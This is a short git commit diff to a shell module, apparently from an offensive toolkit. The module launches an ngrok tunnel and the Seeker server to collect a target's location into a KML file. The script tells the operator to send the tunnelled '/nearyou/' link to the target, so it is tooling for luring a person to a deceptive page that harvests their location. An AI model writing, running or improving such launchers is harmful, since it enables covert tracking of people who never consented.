042ea20c0d1ed7f56ed8ca2d3b3128390e788aaa
s1l3nt78 <s1l3n7h0s7@gmail.com>
2020-08-15 15:13:40 +0200

    Seeker runtime fix

--- modules/credmods/seeker.sh
+++ modules/credmods/seeker.sh
@@ -20,8 +20,8 @@ echo -e "${W}Please enter the output name of KML file${NC}"
 read NAME
 echo -e "${W}===========================================================================${NC}"
 echo -e "${LP}Starting Seeker Server${NC}"
-xterm -e ngrok http 8080
-sudo python3 seeker.py --tunnel manual -k ${NAME}
+xterm -e ngrok http 8080 &
+xterm -e sudo python3 seeker.py --tunnel manual -k ${NAME} &
 echo -e "${LP}Starting Ngrok Server${NC}"
 echo -e "${W}===========================================================================${NC}"
 echo -e "${RED}NOTE: ${ORNG}Send the ngrok link with /nearyou/ prepended at the end to target${NC}"
